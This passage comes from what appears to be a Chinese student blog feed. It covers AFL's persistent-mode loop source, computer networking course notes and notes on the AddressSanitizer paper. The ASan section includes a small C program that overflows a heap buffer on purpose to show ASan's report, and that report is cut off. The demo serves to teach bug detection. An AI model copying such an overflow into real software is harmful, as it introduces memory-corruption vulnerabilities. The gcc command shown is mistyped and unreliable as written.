class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> __AFL_LOOP(_A)  \</span><br><span class="hljs-meta">(&#123; \</span><br><span class="hljs-meta">    static volatile char *_B __attribute__((used));  \</span><br><span class="hljs-meta">    _B = (char*)<span class="hljs-string">&quot;##SIG_AFL_PERSISTENT##&quot;</span>; \</span><br><span class="hljs-meta">    __attribute__((visibility(<span class="hljs-string">&quot;default&quot;</span>))) int _L(unsigned int) __asm__(<span class="hljs-string">&quot;__afl_persistent_loop&quot;</span>); \</span><br><span class="hljs-meta">    _L(_A); \</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></td></tr></table></figure><p>宏定义 <code>__AFL_LOOP</code>内部调用<code>__afl_persistent_loop</code>函数</p><p>该函数源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* A simplified persistent mode handler, used as explained in README.llvm. */</span><br><br><span class="hljs-type">int</span> __afl_persistent_loop(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_cnt) &#123;<br><br>  <span class="hljs-type">static</span> u8  first_pass = <span class="hljs-number">1</span>;<br>  <span class="hljs-type">static</span> u32 cycle_cnt;<br><br>  <span class="hljs-keyword">if</span> (first_pass) &#123;<br><br>    <span class="hljs-comment">/* Make sure that every iteration of __AFL_LOOP() starts with a clean slate.</span><br><span class="hljs-comment">      On subsequent calls, the parent will take care of that, but on the first</span><br><span class="hljs-comment">      iteration, it&#x27;s our job to erase any trace of whatever happened</span><br><span class="hljs-comment">      before the loop. */</span><br><br>    <span class="hljs-keyword">if</span> (is_persistent) &#123;<br>     <span class="hljs-comment">// 重置共享内存</span><br>      <span class="hljs-built_in">memset</span>(__afl_area_ptr, <span class="hljs-number">0</span>, MAP_SIZE);<br>      __afl_area_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>      __afl_prev_loc = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    cycle_cnt  = max_cnt;<br>    first_pass = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (is_persistent) &#123;<br><br>    <span class="hljs-keyword">if</span> (--cycle_cnt) &#123;<br><br>      raise(SIGSTOP);<br><br>      __afl_area_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>      __afl_prev_loc = <span class="hljs-number">0</span>;<br><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>      <span class="hljs-comment">/* When exiting __AFL_LOOP(), make sure that the subsequent code that</span><br><span class="hljs-comment">        follows the loop is not traced. We do that by pivoting back to the</span><br><span class="hljs-comment">        dummy output region. */</span><br><br>      __afl_area_ptr = __afl_area_initial;<br><br>    &#125;<br><br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络</title>
    <link href="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <url>/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章-计算机网络和因特网"><a href="#第一章-计算机网络和因特网" class="headerlink" title="第一章-计算机网络和因特网"></a>第一章-计算机网络和因特网</h1><h2 id="因特网构成"><a href="#因特网构成" class="headerlink" title="因特网构成"></a>因特网构成</h2><ul><li>手机、电脑、电视等接入互联网的“物品”称为<strong>主机（host）</strong>或<strong>端系统（end system）</strong>；</li><li>链接上述终端的是<strong>通信链路（communication link）</strong> 和 <strong>分组交换机（packet switch）</strong>；</li><li>链路有**传输速率（transmission rate)**，单位是比特每秒（bps）；</li><li>端向端发送的数据，分段后加上首部字节，这些信息包称为<strong>分组（packet）</strong>；</li><li>两条链路间，转发分组的称为<strong>分组交换机</strong>，最著名的如<strong>路由器（router）</strong>和<strong>链路层交换机（link-layer switch)</strong>;</li><li>端到端之间，一个分组经历的所有链路和分组交换机称为<strong>路径（route 或 path）</strong>；</li><li>端系统通过<strong>因特网服务提供商（Internet Service Provider， ISP）</strong>接入因特网；</li><li>以上因特网部件都要运行一系列<strong>协议（protocol）</strong>，<strong>TCP（Transmission Control Protocol，传输控制协议）</strong>和<strong>IP（Internet Protocol，网际协议）</strong>是两个最重要的协议；</li><li>IP协议定义了在路由器与端系统之间发送和接收的分组格式；</li><li>设计多个端交互数据的程序，称为<strong>分布式应用程序（distributed application）</strong>；</li></ul><h2 id="What-is-Protocol"><a href="#What-is-Protocol" class="headerlink" title="What is Protocol ?"></a>What is Protocol ?</h2><p><strong>协议（protocol）</strong>定义了两个或多个通信实体间交换的报文的格式和顺序，以及发送/接收报文时采取的动作。</p><h2 id="接入网"><a href="#接入网" class="headerlink" title="接入网"></a>接入网</h2><p>这是指将端系统物理连接到其<strong>边缘路由器（edge router）</strong>的网络。<br>边缘路由器是端系统到任何其他远程端系统的路径上的第一台路由器。<br>住户通常从提供本地电话接入的本地电话公司处获得<strong>数字用户线（Digital SubscriberDSL）</strong>因特网接入。因此，当使用DSL时，用户的本地电话公司也是它的ISP。</p><h2 id="卫星无线电信道"><a href="#卫星无线电信道" class="headerlink" title="卫星无线电信道"></a>卫星无线电信道</h2><p>通常使用两类卫星：<strong>同步卫星（geostationary)<strong>和</strong>近地轨道卫星（Low-Earth Orbiting, LEO）</strong>；</p><h2 id="存储转发传输"><a href="#存储转发传输" class="headerlink" title="存储转发传输"></a>存储转发传输</h2><p>存储转发传输指交换机开始向输出链路传输该分组第一个bit前，必须先完整收到整个分组。</p><h2 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h2><p>网络链路和交换机移动数据有两种基本方法：<strong>电路交换（circuit switching）</strong>和<strong>分组交换（packet switching)</strong><br>链路中的电路是通过<strong>频分复用 (Frequency- Division Multiplexing, FDM )<strong>或</strong>时分复用<br>（Time-Division Multiplexing, TDM）</strong>来实现的。</p><h2 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h2><p>这些时延最为重要的是<strong>节点处理时延(nodal processing delay) <strong>、</strong>排队时延(queuing delay)<strong>、</strong>传输时延<br>(transmission delay)<strong>和</strong>传播时延(propagation delay)</strong>,这些时延总体累加起来是**节点总时延(tolal nodal delay)**。<br><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p1.png"></p><p>令Q表示分组到达队列的平均速率（a的单位是分组/秒，即pkt/s）o前面讲过尺是传输速率，即从队列中推出比特的速率（以bps即b/s为单位）。为了简单起见，也假定所有分组都是由厶比特组成的。则比特到达队列的平均速率是La bps。最后，假定该队列非常大，因此它基本能容纳无限数量的比特。比率<code>La/R</code>被称为流量强度（traffic intensity）,它在估计排队时延的范围方面经常起着重要的作用。如果La/R&gt;l,则比特到达队列的平均速率超过从该队列传输岀去的速率。在这种不幸的情况下，该队列趋向于无限增加，并且排队时延将趋向无穷大！因此，流量工程中的一条金科玉律是：设计系统时流量强度不能大于1</p><h2 id="协议分层"><a href="#协议分层" class="headerlink" title="协议分层"></a>协议分层</h2><p>下层为上一层提供<strong>服务（service）</strong>，各层的所有协议称为协议栈（protocol stack）。<br><strong>因特网</strong>的协议栈由5个层次组成：物理层、链路层、网络层、运输层和应用层</p><ul><li>应用层信息分组：报文（message）；</li><li>运输层：报文段（segment）；</li><li>网络层：数据报（datagram）；</li><li>链路层：帧（frame）；</li><li>物理层；</li></ul><p><strong>OSI模型</strong><br>应用层、表示层、会话层、运输层、网络层、数据链路层、物理层。</p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>封装（encapsulation）。一个应用层报文传送给运输层，首部会附带上附加信息，这些一起构成了运输层报文段。再加上另外的首部信息，给到网络层，生成了网络层数据包。接下来生成链路层帧。<br>一个分组具有两种类型的字段：首部字段和**有效载荷字段（payload field） **<br><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p2.png"></p><p><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p3.png"><br><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p4.png"><br><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p5.png"></p><h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>DNS：Domain Name System 域名系统。</p><p>DNS 是：</p><ul><li>一个由分层的 <strong>DNS 服务器</strong>实现的分布式数据库；</li><li>一个使得主机能够查询分布式数据库的应用层协议。</li></ul><p>DNS 服务器通常是运行在 BIND （Berkeley Internet Nmae Domain)软件的 UNIX 机器。DNS 协议 运行在 UDP 上使用 53 端口。</p><p>DNS 将用户提供的主机名（<a href="http://www.kawa.com/">www.kawa.com</a> 类似的）解析为 IP 地址。</p><p>DNS 可以将主机别名进行解析，方便使用</p><h3 id="DNS-的记录和报文"><a href="#DNS-的记录和报文" class="headerlink" title="DNS 的记录和报文"></a>DNS 的记录和报文</h3><p>共同实现 DNS 分布式数据库的所有 DNS 服务器存储了 **资源记录（Resource Record)**，RR 提供主机名到 IP 地址的映射。<br>RR 包含以下字段的四元组：</p><figure class="highlight delphi"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs delphi">(<span class="hljs-keyword">Name</span>, Value, <span class="hljs-keyword">Type</span>, TTL)<br></code></pre></td></tr></table></figure><p>TTL 是记录的生存时间，它决定了资源记录应当从缓存中删除的时间。<br>Name 和 Value 的值取决于 Type：</p><ul><li>若 Type = A ，则 Name 是主机名， Value 是该主机名对应的 IP 地址。</li><li>若 Type = NS，则 Name 是个域（如 foo.com），而 value 是个知道如何获得该域<br>中主机IP地址的权威DNS服务器的主机名，例如(foo.com, dns.foo.com, NS）</li><li>若 Type = CNAME，则 Value 是别名为 Name 的主机对应的规范主机名。例如(foo.com, relay1.bar. foo. com, CNAME)就是一条 CNAME 类型的记录。</li><li>若 Type = MX，则Value 是个别名为 Name 的邮件服务器的规范主机名。举例来说，(foo.com, mail. bar. foo. com, MX)就是一条MX记录。</li></ul><p><strong>DNS报文</strong></p><p><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p6.png"></p><ul><li>前12字节是首部区域</li></ul><h2 id="P2P-文件分发"><a href="#P2P-文件分发" class="headerlink" title="P2P 文件分发"></a>P2P 文件分发</h2><p><strong>最稀缺优先（rarest first）</strong>，针对自身没有的块，优先在其邻居中决定最稀缺的块（副本数最少的块），并请求之。</p><h2 id="视频流和内容分发网"><a href="#视频流和内容分发网" class="headerlink" title="视频流和内容分发网"></a>视频流和内容分发网</h2><p><strong>经 HTTP 的动态适应流 (Dynamic Adaptive Streaming over HTTP, DASH)</strong><br>在 DASH 中，视频编码为几个不同的版本，每个版本由不同的比特率，对应不同质量水平。</p><p><strong>内容分发网（Content Distribution Network，CDN）</strong><br>CDN管理分布在多个地理位置上的服务器，在它的服务器中存储视频（和其他类型的Web内容，包括文档、图片和音频）的副本，并且所有试图将每个用户请求定向到一个将提供最好的用户体验的CDN位置。<br>CDN 可以是专用 CDN ，也可以是第三方 CDN。<br>CDN 部署核心是<strong>集群选择策略（cluster selection strategy)</strong>,即动态地将用户定向到 CDN 中某个服务器集群或数据中心。<br>一种策略是<strong>地理上最为接近（geographically closest）</strong>的集群。</p>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AddressSanitizer</title>
    <link href="/2023/03/02/AddressSanitizer/"/>
    <url>/2023/03/02/AddressSanitizer/</url>
    
    <content type="html"><![CDATA[<h1 id="AddressSanitizer论文"><a href="#AddressSanitizer论文" class="headerlink" title="AddressSanitizer论文"></a>AddressSanitizer论文</h1><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>这个项目可以检测<code>out-of-bounds</code>及<code>use-after-free</code>导致的bug。</p><h2 id="Shadow-Memory"><a href="#Shadow-Memory" class="headerlink" title="Shadow Memory"></a>Shadow Memory</h2><p><strong>何为Shadow Memory</strong><br>引用维基百科：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs mipsasm">In computing, <span class="hljs-keyword">shadow </span>memory is a technique used to track <span class="hljs-keyword">and </span>store information on computer memory used <span class="hljs-keyword">by </span>a program during its execution. <span class="hljs-keyword">Shadow </span>memory consists of <span class="hljs-keyword">shadow </span><span class="hljs-keyword">bytes </span>that map to individual <span class="hljs-keyword">bits </span><span class="hljs-keyword">or </span>one <span class="hljs-keyword">or </span>more <span class="hljs-keyword">bytes </span>in main memory. These <span class="hljs-keyword">shadow </span><span class="hljs-keyword">bytes </span>are typically invisible to the <span class="hljs-keyword">original </span>program <span class="hljs-keyword">and </span>are used to record information about the <span class="hljs-keyword">original </span>piece of data. --维基百科<br></code></pre></td></tr></table></figure><p>简而言之，shadow memory 是用来记录当前进程内存的可访问状态的元数据。<br>本ASAN应用中，利用 shadow memory 的映射，知道当前内存的可访问状态。<br>例如有一块内存M1，其 shadow memory 是S1，当我们需要访问M1时，会先读取S1，若S1记录值允许访问，才可访问。不难发现，如果应用 shadow memory，则需要为其单独分配空间来储存状态量。<br><strong>更高效的映射方法</strong><br>ASAN使用了一种更高效的映射方法，可以将一块 8Byte 的内存块用 1Byte 的内存表示。<br>因为 malloc 函数返回地址（分配地址）是 8Byte 对齐的，故一块内存可以进行寻址访问的状态便有以下9种：</p><ul><li>整块内存（8Byte）均无法访问；</li><li>整块内存（8Byte）均可访问；</li><li>仅内存的前k字节可访问（k从1~7之间取值）。</li></ul><p>那么一块内存的访问状态，便可以用 1Byte 大小的空间进行表示，甚至完全不需要 1Byte。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle">什么是 <span class="hljs-number">8</span><span class="hljs-keyword">Byte</span> 对齐？<br><br>当使用 malloc 函数分配空间时，比如<br><span class="hljs-keyword">void</span> *p1 = malloc(<span class="hljs-number">1</span>);<br>我申请了<span class="hljs-number">1</span>个字节大小的内存，但 malloc 函数会分配给我<span class="hljs-number">8</span>个字节的连续的一块内存。<br>这就是 <span class="hljs-number">8</span><span class="hljs-keyword">byte</span> 对齐<br><br>为什么是<span class="hljs-number">9</span>个状态？<br><br>首先，如果该内存块未被分配，即全部无法访问，对应一种；<br>如果该内存块全部被分配，则全部可以访问，对应一种；<br>由于内存块是连续分配的，故不可能出现 连续的 <span class="hljs-number">8</span><span class="hljs-keyword">Byte</span> 内，第<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span> <span class="hljs-keyword">Byte</span> 可访问，第 <span class="hljs-number">4</span> <span class="hljs-keyword">Byte</span>不可访问，而第 <span class="hljs-number">5</span> <span class="hljs-keyword">Byte</span> 又可以访问的情况，故对应了<span class="hljs-number">7</span>种情况，即该块内，前k个 <span class="hljs-keyword">Byte</span> 可访问，而后 <span class="hljs-number">8</span> - k <span class="hljs-keyword">Byte</span>无法访问。共对应 <span class="hljs-number">7</span> 种情况。<br>故一共是 <span class="hljs-number">1</span> + <span class="hljs-number">1</span> + <span class="hljs-number">7</span> = <span class="hljs-number">9</span> 种状态。<br><br></code></pre></td></tr></table></figure><p><strong>Shadow Memory 对应算法</strong><br>即如何将 Memory 的内容映射至 Shadow 呢<br>使用以下公式，其中 ADDR 表示当前内存块的地址：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">(<span class="hljs-keyword">ADDR</span> &gt;&gt; <span class="hljs-number">3</span>) + OFFSET<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>即右移三位后，统一加上一个偏移值 OFFSET 避免与正常允许的内存产生冲突。</p><p><strong>Shadow Memory 中存放的值</strong><br>规则如下：</p><ul><li>当该 Shadow Memory 值为0时，表示该内存块所有地址均可寻址；</li><li>值为1~7的整数时，表示前k个地址可寻址；</li><li>值为任意负数时，表示不可寻址；<br>且<strong>不同的负数</strong>表示不同的不可寻址：heap redzones， stack redzones, global redzones, freed redzones)</li></ul><h2 id="判断是否访问了不能访问的内存"><a href="#判断是否访问了不能访问的内存" class="headerlink" title="判断是否访问了不能访问的内存"></a>判断是否访问了不能访问的内存</h2><p>首先，当 AccessSize 也就是访问的位数等于8时</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">ShadowAddr </span>= (<span class="hljs-keyword">Addr </span>&gt;&gt; <span class="hljs-number">3</span>) + Offset;<br>if(*<span class="hljs-keyword">ShadowAddr </span>!= <span class="hljs-number">0</span>)<br>   ReportAndCrash(<span class="hljs-keyword">Addr);</span><br><span class="hljs-keyword"></span>   <br></code></pre></td></tr></table></figure><p>当 AccessSize 为 1 、 2 、 4时，需要将Addr带入，与7做AND操作后，进行判断</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lisp">ShadowAddr = (<span class="hljs-name">Addr</span> &gt;&gt; <span class="hljs-number">3</span>) + Offset<span class="hljs-comment">;</span><br>k = *ShadowAddr<span class="hljs-comment">;</span><br>if ( <span class="hljs-name">k</span> != <span class="hljs-number">0</span> <span class="hljs-symbol">&amp;&amp;</span> ((<span class="hljs-name">Addr</span> &amp; <span class="hljs-number">7</span> ) + AccessSize &gt; k))<br>     ReportAndCrash(<span class="hljs-name">Addr</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>为何此处是 <code>Addr &amp; 7 + AccessSize</code>与 k（可访问字节数）做比较呢<br>因为 Addr &amp; 7 代表被访问的该内存（这一Byte），相对其之前一个“对齐点”的位移，加上妄图访问的字节数后，就是最终访问的总字节数，用其与 k 比大小，可判断是否越界。</p><p><strong>关于代码插桩何时介入</strong><br>放到LLVM优化的靠后位置，这样只需要对被LLVM进行过优化的代码进行插桩，减少了不必要的插入。<br>该报错代码 <code>ReportAndCrash</code> 只会执行一次就中断程序。</p><p><strong>运行时</strong>：<br>调用 malloc 函数会返回一段内存，和两端额外的内存，延申在原本申请的内存两端，这被称为<code> redzone</code>或称为 <code>poisoned</code>，分配的 <code> red zone</code> 越大，找到溢出漏洞的概率越大。<br>设置redzone将分配的内存段包住，有以下关系：<br>当分配的内存段数量为 n 时， redzones 的数量应该是 n+1 </p><p>free 函数会将释放区域全部设置为 poisoned 且不会恢复，即该区域暂时不会再次被 malloc。这被叫做拖入隔离区，隔离区是一个大小固定的 FIFO 队列。默认情况下，malloc和free会记录当前的调用栈以为bug报告提供更多信息</p><p><strong>栈及全局对象的检测</strong></p><p>对于全局对象，redzones 是在编译时被放入的，随后在程序运行时，这些地址被传入<code> runtime library</code>。程序运行时，这些 redzones 会被 标记为 <code>poisoned</code></p><p>对于栈来说，redzones 的创建与染毒，是都在 runtime 发生的。</p><p><strong>错误及漏报</strong><br>比较具代表性的：<br>直接跨越了一个 redzone<br>即 a 分配了 500字节，a 右侧 redzone 大小为500 字节，b分配了 5000字节大小<br>若一个指针从 a 读取，偏移量达到1000，则很可能直接访问了b区的合法区域。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *a = new <span class="hljs-type">char</span>[<span class="hljs-number">100</span>];<br><br><span class="hljs-type">char</span> *b = new <span class="hljs-type">char</span>[<span class="hljs-number">1000</span>];<br><br>a[<span class="hljs-number">500</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">// may end up somewhere in b</span><br></code></pre></td></tr></table></figure><h1 id="ASan-实际测试"><a href="#ASan-实际测试" class="headerlink" title="ASan 实际测试"></a>ASan 实际测试</h1><h2 id="堆越界"><a href="#堆越界" class="headerlink" title="堆越界"></a>堆越界</h2><p>程序源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">char</span> *heap_buf = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">32</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>));<br>        <span class="hljs-built_in">memcpy</span>(heap_buf+<span class="hljs-number">30</span>, <span class="hljs-string">&quot;overflow&quot;</span>, <span class="hljs-number">8</span>);    <span class="hljs-comment">//在heap_buf的第30个字节开始，拷贝8个字符</span><br><br>        <span class="hljs-built_in">free</span>(heap_buf);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出，申请了32个字节，但是会访问至 base_addr + 37 字节处，来看看 asan 怎么处理</p><p>编译：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gcc <span class="hljs-attribute">-fsanitizer</span>=addresss -fno-omit-frame-pointer -o test1 test1.c<br></code></pre></td></tr></table></figure><p>运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./test1<br></code></pre></td></tr></table></figure><p>以下是运行结果，即asan给出的错误信息</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs tap">=================================================================<br>==3905==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x603000000060 at pc 0x7f09040c62c3 bp 0x7ffcf197b180 sp 0x7ffcf197a928<br>WRITE of size<span class="hljs-number"> 8 </span>at 0x603000000060 thread T0<br>    <span class="hljs-comment">#0 0x7f09040c62c2 in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827</span><br>    <span class="hljs-comment">#1 0x5605f809b241 in main (/home/stre/Desktop/test1+0x1241)</span><br>    <span class="hljs-comment">#2 0x7f0903e91fcf in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span><br>    <span class="hljs-comment">#3 0x7f0903e9207c in __libc_start_main_impl ../csu/libc-start.c:409</span><br>    <span class="hljs-comment">#4 0x5605f809b144 in _start (/home/stre/Desktop/test1+0x1144)</span><br><br>0x603000000060 is located<span class="hljs-number"> 0 </span>bytes to the right of 32-byte region [0x603000000040,0x603000000060)<br>allocated by thread T0 here:<br>    <span class="hljs-comment">#0 0x7f0904140867 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145</span><br>    <span class="hljs-comment">#1 0x5605f809b21e in main (/home/stre/Desktop/test1+0x121e)</span><br>    <span class="hljs-comment">#2 0x7f0903e91fcf in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span><br><br>SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827 in __interceptor_memcpy<br>Shadow bytes around the buggy address:<br>  0x0c067fff7fb0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0c067fff7fc0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0c067fff7fd0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0c067fff7fe0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0c067fff7ff0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>=&gt;0x0c067fff8000: fa fa<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>fa fa fa<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00[fa]fa fa fa<br>  0x0c067fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  0x0c067fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  0x0c067fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  0x0c067fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  0x0c067fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>Shadow byte legend (one shadow byte represents<span class="hljs-number"> 8 </span>application bytes):<br>  Addressable:           00<br>  Partially addressable:<span class="hljs-number"> 01 </span>02<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 05 </span>06<span class="hljs-number"> 07 </span><br>  Heap left redzone:       fa<br>  Freed heap region:       fd<br>  Stack left redzone:      f1<br>  Stack mid redzone:       f2<br>  Stack right redzone:     f3<br>  Stack after return:      f5<br>  Stack use after scope:   f8<br>  Global 